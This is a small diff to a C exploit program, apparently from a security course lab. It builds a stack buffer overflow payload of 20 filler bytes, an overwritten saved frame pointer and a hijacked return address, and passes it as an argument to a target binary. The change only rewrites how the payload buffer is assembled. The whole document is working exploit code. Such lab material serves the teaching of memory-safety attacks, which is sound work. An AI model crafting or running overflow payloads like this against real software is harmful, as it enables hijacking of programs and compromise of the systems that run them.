@@ -9,14 +9,13 @@ int main(void) {
   char *args[3];
   char *env[1];
 
-  char arg[] = {
-      [0 ... 19] = 'A',       // buffer
-      0x48, 0xF8, 0xFF, 0xBF, // sfp
-      0x15, 0x85, 0x04, 0x08  // ret
-  };
+  char buf[29];
+  memset(buf, 'A', sizeof(buf));
+  strcpy(buf + 20, "\x48\xf8\xff\xbf"   // sfp
+                   "\x15\x85\x04\x08"); // ret
 
   args[0] = TARGET;
-  args[1] = arg;
+  args[1] = buf;
   args[2] = NULL;
   env[0] = NULL;
 
